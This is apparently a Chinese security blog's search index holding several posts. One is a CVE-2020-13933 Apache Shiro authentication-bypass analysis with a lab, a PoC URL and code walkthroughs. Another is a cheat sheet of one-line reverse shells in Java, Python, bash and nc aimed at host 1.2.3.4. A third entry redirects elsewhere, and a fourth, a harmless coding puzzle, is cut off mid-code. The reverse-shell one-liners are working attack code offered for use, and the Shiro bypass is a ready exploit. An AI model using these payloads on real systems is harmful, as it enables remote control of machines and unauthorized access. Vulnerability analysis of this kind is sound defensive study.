<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CVE-2020-13933 漏洞分析</title>
      <link href="/articles/safe/cve-2020-13933-lou-dong-fen-xi/"/>
      <url>/articles/safe/cve-2020-13933-lou-dong-fen-xi/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞背景"><a href="#漏洞背景" class="headerlink" title="漏洞背景"></a>漏洞背景</h2><p>Apache Shiro 是一个强大且易用的 Java 安全框架，执行身份验证、授权、密码和会话管理，通常会和 Spring 等框架一起搭配使用来开发 web 应用（请求在到达 Spring 之前，会先经过 Shiro 认证身份）。</p><p>因为某个特定测试场景，Shiro 被白帽子发现了 CVE-2020-11989 身份校验绕过漏洞，漏洞原因在于 Shiro 处理 url 的逻辑与 spring 存在差异。</p><p>对此官方发布了 1.5.3 版本进行修复，但是因为修复补丁存在缺陷， 再次导致了 CVE-2020-13933 身份校验绕过漏洞，官方不得不再次发布了 1.6.0 修复版本。</p><h2 id="漏洞靶场"><a href="#漏洞靶场" class="headerlink" title="漏洞靶场"></a>漏洞靶场</h2><h3 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h3><p>环境要求：</p><ul><li>JDK: <code>1.8</code></li><li>spring-boot: <code>2.3.3</code></li><li>apache-shiro: <code>1.5.3 (&lt; 1.6.0)</code></li></ul><p>靶场源码（Maven）： <a href="https://github.com/lyy289065406/CVE-2020-13933">https://github.com/lyy289065406/CVE-2020-13933</a></p><p>靶场关键代码说明：</p><ul><li><a href="https://github.com/lyy289065406/CVE-2020-13933/blob/master/src/main/java/com/exp/cve/ShiroConfig.java"><code>ShiroConfig.java</code></a>： 权限配置， 当请求 <code>/res/*</code> 资源时， 302 跳转到登陆页面进行身份认证</li><li><a href="https://github.com/lyy289065406/CVE-2020-13933/blob/master/src/main/java/com/exp/cve/NameController.java"><code>NameController.java</code></a>：<br>　　· <code>/res/{name}</code>： 请求名为 <code>name</code> 的的资源（触发身份认证）<br>　　· <code>/res/</code>： 不请求任何资源（不触发身份认证）</li></ul><blockquote><p>此靶场已收录到 <a href="https://vulmon.com/vulnerabilitydetails?qid=CVE-2020-13933">Vulmon 漏洞情报搜索引擎</a></p></blockquote><h3 id="靶场验证"><a href="#靶场验证" class="headerlink" title="靶场验证"></a>靶场验证</h3><p>不在请求路由中指定资源名称时，不触发身份验证，也无资源返回： <a href="http://127.0.0.1:8080/res/"><code>http://127.0.0.1:8080/res/</code></a></p><p><img src="./01.png"></p><p>在请求路由中指定资源名称时，302 跳转到身份验证页面： <a href="http://127.0.0.1:8080/res/poc"><code>http://127.0.0.1:8080/res/poc</code></a></p><p><img src="./02.png"></p><p>构造特定 PoC 请求指定资源时，不触发身份验证，并返回资源： <a href="http://127.0.0.1:8080/res/%3bpoc">http://127.0.0.1:8080/res/%3bpoc</a> （<code>%3b</code> 是 <code>;</code> 的 URL 编码）</p><p><img src="./03.png"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="前置漏洞回顾"><a href="#前置漏洞回顾" class="headerlink" title="前置漏洞回顾"></a>前置漏洞回顾</h3><p>通过漏洞背景可知， CVE-2020-13933 是 CVE-2020-11989 的修复补丁不当产生的，因此有必要了解 CVE-2020-11989 的漏洞原因、以及官方补丁的改动位置。</p><p>通过查阅 CVE-2020-11989 现有的<a href="https://xz.aliyun.com/t/7964">漏洞分析报告</a>， 可知 Shiro 为了处理请求路由中形如 <code>;jsessionid=C7E5ED51DCE6B918FD88AE5575C589B6</code> 的参数，会截断 <code>;</code> 后的内容。</p><p>对于 Shiro <code>&lt; 1.5.3</code> 的版本，因为相关逻辑缺陷，若刻意构造路由类似 <code>/;/site/res/name</code> 的请求，会因为匹配错误导致请求路由截断成 <code>/</code>，此时因为没有指定要请求的资源路由，故不会触发 Shiro 的身份认证逻辑。</p><p>因为不需要认证身份，请求 <code>/;/site/res/name</code> 被直接送到 Spring 获取资源，经过 Spring 格式化后（截取根目录后的资源路径），请求路由截断成 <code>/res/name</code>，最终可以成功获取到资源页面，导致 Shiro 权限绕过。</p><p>为了修复这个漏洞， Shiro 发布了 1.5.3 版本，可以对比下官方修复的代码位置：</p><p>【修改前】 <a href="https://github.com/apache/shiro/blob/shiro-root-1.5.2-release-vote1/web/src/main/java/org/apache/shiro/web/util/WebUtils.java"><code>Shiro 1.5.2</code></a>:</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> String <span class="token function">getPathWithinApplication</span><span class="token punctuation">(</span>HttpServletRequest request<span class="token punctuation">)</span> <span class="token punctuation">{</span>    String contextPath <span class="token operator">=</span> <span class="token function">getContextPath</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>    String requestUri <span class="token operator">=</span> <span class="token function">getRequestUri</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">startsWithIgnoreCase</span><span class="token punctuation">(</span>requestUri<span class="token punctuation">,</span> contextPath<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Normal case: URI contains context path.</span>        String path <span class="token operator">=</span> requestUri<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>contextPath<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">hasText</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span> <span class="token operator">?</span> path <span class="token operator">:</span> <span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Special case: rather unusual.</span>        <span class="token keyword">return</span> requestUri<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>【修改后】 <a href="https://github.com/apache/shiro/blob/shiro-root-1.5.3-release-vote1/web/src/main/java/org/apache/shiro/web/util/WebUtils.java"><code>Shiro 1.5.3</code></a>:</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> String <span class="token function">getPathWithinApplication</span><span class="token punctuation">(</span>HttpServletRequest request<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">normalize</span><span class="token punctuation">(</span><span class="token function">removeSemicolon</span><span class="token punctuation">(</span><span class="token function">getServletPath</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">getPathInfo</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="当前漏洞分析"><a href="#当前漏洞分析" class="headerlink" title="当前漏洞分析"></a>当前漏洞分析</h3><p>由于官方更新 <a href="https://github.com/apache/shiro/blob/shiro-root-1.5.3-release-vote1/web/src/main/java/org/apache/shiro/web/util/WebUtils.java"><code>Shiro 1.5.3</code></a> 版本后，身份绕过漏洞依旧存在，说明这次代码修复的逻辑仍有不完善的地方。</p><p>为了分析漏洞成因，可以先搭建上述的靶场，然后在 <a href="https://github.com/apache/shiro/blob/shiro-root-1.5.3-release-vote1/web/src/main/java/org/apache/shiro/web/util/WebUtils.java"><code>Shiro 1.5.3</code></a> 的官方修复代码打断点 DEBUG。</p><p>不难发现，修复代码位置在 Shiro 处理请求路由的入口处 <a href="https://github.com/apache/shiro/blob/shiro-root-1.5.3-release-vote1/web/src/main/java/org/apache/shiro/web/util/WebUtils.java"><code>WebUtils.java</code></a>。为了便于分析，这里对代码做了逐行拆解：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">// 输入请求路由： http://127.0.0.1:8080/res/%3bpoc</span><span class="token keyword">public</span> <span class="token keyword">static</span> String <span class="token function">getPathWithinApplication</span><span class="token punctuation">(</span>HttpServletRequest request<span class="token punctuation">)</span> <span class="token punctuation">{</span>    String servletPath <span class="token operator">=</span> <span class="token function">getServletPath</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">// servletPath = "/res/;poc" （URL 已解码）</span>    String pathInfo <span class="token operator">=</span> <span class="token function">getPathInfo</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">// pathInfo = ""</span>    String path <span class="token operator">=</span> servletPath <span class="token operator">+</span> pathInfo<span class="token punctuation">;</span>           <span class="token comment" spellcheck="true">// path = "/res/;poc"</span>    path <span class="token operator">=</span> <span class="token function">removeSemicolon</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment" spellcheck="true">// path = "/res/"  （截断 ; 后面的内容）</span>    path <span class="token operator">=</span> <span class="token function">normalize</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>                         <span class="token comment" spellcheck="true">// path = "/res/"  （标准化 URL： 处理双斜杠、路径穿越）</span>    <span class="token keyword">return</span> path<span class="token punctuation">;</span>                                    <span class="token comment" spellcheck="true">// path = "/res/"</span><span class="token comment" spellcheck="true">//  return normalize(removeSemicolon(getServletPath(request) + getPathInfo(request)));</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="./04.png"></p><p>很明显，该 PoC 通过 Shiro 处理后， 请求路由 <code>/res/%3bpoc</code> 会变成 <code>/res/</code>， 根据前面靶场的验证结果，因为此路由没有指定资源名称，因此不会触发身份认证，请求会直接送到 Spring 的相关逻辑处理以获取资源。</p><p>此时再 DEBUG 看看 Spring 的处理请求路由的入口代码 <a href="https://github.com/spring-projects/spring-framework/blob/v5.2.5.RELEASE/spring-web/src/main/java/org/springframework/web/util/UrlPathHelper.java"><code>UrlPathHelper.java</code></a> 是如何做的：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">// 输入请求路由： http://127.0.0.1:8080/res/%3bpoc</span><span class="token keyword">private</span> String <span class="token function">decodeAndCleanUriString</span><span class="token punctuation">(</span>HttpServletRequest request<span class="token punctuation">,</span> String uri<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// uri = "/res/%3bpoc" （URL 未解码）</span>    uri <span class="token operator">=</span> <span class="token function">removeSemicolonContent</span><span class="token punctuation">(</span>uri<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">// uri = "/res/%3bpoc"  （截断 ; 后面的内容）</span>    uri <span class="token operator">=</span> <span class="token function">decodeRequestString</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> uri<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// uri = "/res/;poc"    （URL 字符解码）</span>    uri <span class="token operator">=</span> <span class="token function">getSanitizedPath</span><span class="token punctuation">(</span>uri<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// uri = "/res/;poc"    （标准化 URL： 处理双斜杠）</span>    <span class="token keyword">return</span> uri<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="./05.png"></p><p>其实在这里已经可以发现，因为 Shiro 和 Spring 对 URL 的处理逻辑顺序不一致，导致两者得到的路由不同。</p><p>不妨根据这两段代码的逻辑，横向对比输入不同 URL 的情况下最终结果有什么差异。</p><ol><li>当输入为 <a href="http://127.0.0.1:8080/res/%3bpoc">http://127.0.0.1:8080/res/%3bpoc</a> 时：</li></ol><table><thead><tr><th align="center">Shiro 逻辑</th><th align="center">路由</th><th align="center">Spring 逻辑</th><th align="center">路由</th></tr></thead><tbody><tr><td align="center">输入</td><td align="center"><code>/res/%3bpoc</code></td><td align="center">输入</td><td align="center"><code>/res/%3bpoc</code></td></tr><tr><td align="center">URL 解码</td><td align="center"><code>/res/;poc</code></td><td align="center">截断 <code>;</code></td><td align="center"><code>/res/%3bpoc</code></td></tr><tr><td align="center">截断 <code>;</code></td><td align="center"><code>/res/</code></td><td align="center">URL 解码</td><td align="center"><code>/res/;poc</code></td></tr><tr><td align="center">URL 标准化</td><td align="center"><code>/res/</code></td><td align="center">URL 标准化</td><td align="center"><code>/res/;poc</code></td></tr><tr><td align="center">资源名</td><td align="center">无资源名</td><td align="center">资源名</td><td align="center"><code>;poc</code></td></tr><tr><td align="center">结果</td><td align="center">不触发验证</td><td align="center">结果</td><td align="center">返回资源页面</td></tr></tbody></table><ol start="2"><li>当输入为 <a href="http://127.0.0.1:8080/res/;poc">http://127.0.0.1:8080/res/;poc</a> 时：</li></ol><table><thead><tr><th align="center">Shiro 逻辑</th><th align="center">路由</th><th align="center">Spring 逻辑</th><th align="center">路由</th></tr></thead><tbody><tr><td align="center">输入</td><td align="center"><code>/res/;poc</code></td><td align="center">输入</td><td align="center"><code>/res/;poc</code></td></tr><tr><td align="center">URL 解码</td><td align="center"><code>/res/;poc</code></td><td align="center">截断 <code>;</code></td><td align="center"><code>/res/</code></td></tr><tr><td align="center">截断 <code>;</code></td><td align="center"><code>/res/</code></td><td align="center">URL 解码</td><td align="center"><code>/res/</code></td></tr><tr><td align="center">URL 标准化</td><td align="center"><code>/res/</code></td><td align="center">URL 标准化</td><td align="center"><code>/res/</code></td></tr><tr><td align="center">资源名</td><td align="center">无资源名</td><td align="center">资源名</td><td align="center">无资源名</td></tr><tr><td align="center">结果</td><td align="center">不触发验证</td><td align="center">结果</td><td align="center">无资源返回</td></tr></tbody></table><ol start="3"><li>当输入为 <a href="http://127.0.0.1:8080/res/poc">http://127.0.0.1:8080/res/poc</a> 时：</li></ol><table><thead><tr><th align="center">Shiro 逻辑</th><th align="center">路由</th><th align="center">Spring 逻辑</th><th align="center">路由</th></tr></thead><tbody><tr><td align="center">输入</td><td align="center"><code>/res/poc</code></td><td align="center">输入</td><td align="center"><code>/res/poc</code></td></tr><tr><td align="center">URL 解码</td><td align="center"><code>/res/poc</code></td><td align="center">截断 <code>;</code></td><td align="center"><code>/res/poc</code></td></tr><tr><td align="center">截断 <code>;</code></td><td align="center"><code>/res/poc</code></td><td align="center">URL 解码</td><td align="center"><code>/res/poc</code></td></tr><tr><td align="center">URL 标准化</td><td align="center"><code>/res/poc</code></td><td align="center">URL 标准化</td><td align="center"><code>/res/poc</code></td></tr><tr><td align="center">资源名</td><td align="center"><code>poc</code></td><td align="center">资源名</td><td align="center"><code>poc</code></td></tr><tr><td align="center">结果</td><td align="center">302 跳转身份认证</td><td align="center">结果</td><td align="center">返回资源页面</td></tr></tbody></table><ol start="4"><li>当输入为 <a href="http://127.0.0.1:8080/res/">http://127.0.0.1:8080/res/</a> 时：</li></ol><table><thead><tr><th align="center">Shiro 逻辑</th><th align="center">路由</th><th align="center">Spring 逻辑</th><th align="center">路由</th></tr></thead><tbody><tr><td align="center">输入</td><td align="center"><code>/res/</code></td><td align="center">输入</td><td align="center"><code>/res/</code></td></tr><tr><td align="center">URL 解码</td><td align="center"><code>/res/</code></td><td align="center">截断 <code>;</code></td><td align="center"><code>/res/</code></td></tr><tr><td align="center">截断 <code>;</code></td><td align="center"><code>/res/</code></td><td align="center">URL 解码</td><td align="center"><code>/res/</code></td></tr><tr><td align="center">URL 标准化</td><td align="center"><code>/res/</code></td><td align="center">URL 标准化</td><td align="center"><code>/res/</code></td></tr><tr><td align="center">资源名</td><td align="center">无资源名</td><td align="center">资源名</td><td align="center">无资源名</td></tr><tr><td align="center">结果</td><td align="center">不触发验证</td><td align="center">结果</td><td align="center">无资源返回</td></tr></tbody></table><h3 id="分析结论"><a href="#分析结论" class="headerlink" title="分析结论"></a>分析结论</h3><p>显然除了第 1 种输入，其它 3 种输入的最终输出碰巧都是一致的，而第 1 种输入正是此漏洞的 PoC 。</p><p>造成这种情况的根本原因在于 Shiro 和 Spring 在【URL 截断】和【URL 解码】的操作顺序不一致。</p><p>回顾 URL 的处理过程，总结下来就是：</p><ul><li>URL 进入到 Shiro 时，因为先做 URL 编码 <code>%3b =&gt; ;</code> ，使得路由中的资源名被截断删除</li><li>Shiro 误以为请求路由中无资源名，故该次请求不触发身份认证逻辑</li><li>因不需要身份认证，请求路由被直接转发到 Spring</li><li>Spring 从请求路由中正确截取资源名称，并返回资源页面</li><li>最终导致 Shiro 身份认证被绕过</li></ul><blockquote><p>由于 Shiro 的身份认证是通过判断 URL 匹配来实现的，只要能找到 Shiro 处理 URL 逻辑与 Spring 框架处理 URL 逻辑不一致的地方，都有可能造成身份认证绕过。</p></blockquote><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>对于这个漏洞，PoC 亦是 EXP ，只需要把 <code>%3b</code> 放在请求资源路由的最前面，即可绕过认证实现资源访问。</p><p>例如： <code>http://127.0.0.1:8080/res/%3b{资源名}</code> （<code>res</code> 属于站点根目录， 不属于资源路由的一部分）</p><p>当资源路由为后台路径时，攻击者即可绕过认证访问到后台资源。</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>从漏洞分析过程可知，只需要调整 Shiro 处理逻辑顺序，使其与 Spring 保持一致即可修复此漏洞。</p><p>但是可能考虑到相同的漏洞已经出现连续了 2 次，所以官方使用了一种更灵活的修复方式：</p><p>不难发现官方补丁 <a href="https://github.com/apache/shiro/blob/shiro-root-1.6.0/web/src/main/java/org/apache/shiro/web/util/WebUtils.java"><code>Shiro 1.6.0</code></a> 并没有修复 <a href="https://github.com/apache/shiro/blob/shiro-root-1.5.3-release-vote1/web/src/main/java/org/apache/shiro/web/util/WebUtils.java"><code>Shiro 1.5.3</code></a> 中有关 <code>WebUtils</code> 的问题代码。</p><p>取而代之的是引入了责任链模式，增加了针对 URL 的预处理过滤器 <a href="https://github.com/apache/shiro/blob/shiro-root-1.6.0/web/src/main/java/org/apache/shiro/web/filter/InvalidRequestFilter.java"><code>InvalidRequestFilter.java</code></a>，使得 URL 在到进入 Shiro 处理逻辑之前，就通过过滤器对分号、反斜杠和非 ASCII 字符预先进行过滤。尔后若这段修复代码再出现类似漏洞 ，要修复则简单得多。</p><h2 id="挖掘思路"><a href="#挖掘思路" class="headerlink" title="挖掘思路"></a>挖掘思路</h2><p>前面已经说过，由于 Shiro 的权限校验是通过判断 url 匹配来实现的，因此一般的挖掘思路是： 如果能找到 Shiro 处理 URL 逻辑与 web 框架处理 URL 逻辑不一致的地方，那么就有可能利用它进行权限绕过。</p><p>但说到底，此漏洞是某个白帽子在做渗透测试试题时偶尔发现的，否则除非是深谙 Shiro 和相关 web 框架的源码、知道两者处理 URL 逻辑的不一致，不然要在正常情况下发现这个漏洞几无可能。</p><p>在不熟悉底层代码逻辑的前提下，可以留意所关注框架的 CVE 修复补丁，通过确认修复内容，推理修复逻辑是否完整合理，也不失是一种捷径。这个漏洞也是这样被发现的，可以说这个漏洞的发现，偶然中带着必然。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li>《<a href="https://github.com/apache/shiro">Github： Apache Shiro 源码</a>》</li><li>《<a href="https://xz.aliyun.com/t/7964">Apache Shiro权限绕过漏洞分析(CVE-2020-11989)</a>》</li><li>《<a href="https://vulmon.com/vulnerabilitydetails?qid=CVE-2020-13933">Vulmon 漏洞情报（CVE-2020-13933）</a>》</li><li>《<a href="https://nosec.org/home/detail/4531.html">【安全通报】Apache Shiro &lt; 1.6.0 权限绕过漏洞（CVE-2020-13933）</a>》</li><li>《<a href="https://www.anquanke.com/post/id/214964">shiro &lt; 1.6.0的认证绕过漏洞分析(CVE-2020-13933)</a>》</li><li>《<a href="https://xz.aliyun.com/t/8223">shiro CVE-2020-11989&amp;CVE-2020-13933复现分析</a>》</li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>各种语言的一句话反弹 shell 命令</title>
      <link href="/articles/safe/ge-chong-yu-yan-yi-ju-hua-fan-dan-shell/"/>
      <url>/articles/safe/ge-chong-yu-yan-yi-ju-hua-fan-dan-shell/</url>
      
        <content type="html"><![CDATA[<h2 id="被攻击主机先监听端口"><a href="#被攻击主机先监听端口" class="headerlink" title="被攻击主机先监听端口"></a>被攻击主机先监听端口</h2><p>这是大前提，至于怎么做就看 hacker 的能力了，最简单脚本可以用 nc ：</p><pre class="line-numbers language-bash"><code class="language-bash">nc -lvvp 9527<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="攻击主机连接到服务端口"><a href="#攻击主机连接到服务端口" class="headerlink" title="攻击主机连接到服务端口"></a>攻击主机连接到服务端口</h2><h3 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h3><pre class="line-numbers language-java"><code class="language-java">Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"exec 5&lt;>/dev/tcp/1.2.3.4/9527;cat &lt;&amp;5 | while read line; do \$line 2>&amp;5 >&amp;5; done"</span><span class="token punctuation">]</span> as String<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><pre class="line-numbers language-python"><code class="language-python">python <span class="token operator">-</span>c <span class="token string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("1.2.3.4",9527));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/1.2.3.4/9527 0<span class="token operator">></span><span class="token operator">&amp;</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h3><pre class="line-numbers language-bash"><code class="language-bash">nc -e /bin/sh 1.2.3.4 9527<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">mknod</span> /tmp/backpipe p/bin/sh 0<span class="token operator">&lt;</span>/tmp/backpipe <span class="token operator">|</span> nc 1.2.3.4 9527 1<span class="token operator">></span>/tmp/backpipe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> 反弹shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>威胁情报播报</title>
      <link href="/articles/safe/threat-broadcast/"/>
      <url>/articles/safe/threat-broadcast/</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://lyy289065406.github.io/threat-broadcast/">正在重定向到内容页面 ……</a></p></blockquote><p><a href="https://lyy289065406.github.io/threat-broadcast/">如果您的浏览器没有自动跳转， 请点击这里</a></p>    <!-- 自动跳转 -->    <meta http-equiv="refresh" content="0; url=https://lyy289065406.github.io/threat-broadcast/"><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> 威胁情报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何令永假式成真？</title>
      <link href="/articles/safe/ru-he-ling-yong-jia-shi-cheng-zhen/"/>
      <url>/articles/safe/ru-he-ling-yong-jia-shi-cheng-zhen/</url>
      
        <content type="html"><![CDATA[<p>最近在 <a href="https://stackoverflow.com/questions/48270127/can-a-1-a-2-a-3-ever-evaluate-to-true">Stack Overflow</a> 无意中发现一个挺有意思的问题：</p><blockquote><p>是否可以令永假式 <code>a == 1 &amp;&amp; a == 2 &amp;&amp; a == 3</code> 的值为 <code>true</code> ？**</p></blockquote><h2 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h2><p>当时看到题干，条件反射就想到了可以通过 C++ 实现，因为 C++ 是可以重写运算符的，其实现代码如下：</p><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">NumOP</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span><span class="token operator">:</span>        <span class="token keyword">int</span> num<span class="token punctuation">;</span>    <span class="token keyword">public</span><span class="token operator">:</span>        <span class="token function">NumOP</span><span class="token punctuation">(</span><span class="token keyword">int</span> num<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>num <span class="token operator">=</span> num<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">bool</span> <span class="token keyword">operator</span><span class="token operator">==</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">int</span><span class="token operator">&amp;</span> num<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>num <span class="token operator">&lt;=</span> num<span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    NumOP <span class="token function">a</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"impossable!"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"It's right."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因为闲得慌，又萌生出了一个念头：其他语言是否也都可以实现这个表达式呢？</p><p>其实仔细分分析一下题干，要使得表达式成真，可以从两个思路切入：</p><ul><li>(1) 要么 <code>==</code> 的判定逻辑被篡改</li><li>(2) 要么 <code>a</code> 的值要在判断过程中自动变化，此时 <code>a</code> 不可能是基础数据类型（可能是对象、是函数、或是引用）</li></ul><h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><p>因为 Python 和 C++ 同样支持运算符重写，于是类似地可以得到 Python 的实现代码：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">NumOP</span> <span class="token punctuation">:</span>    <span 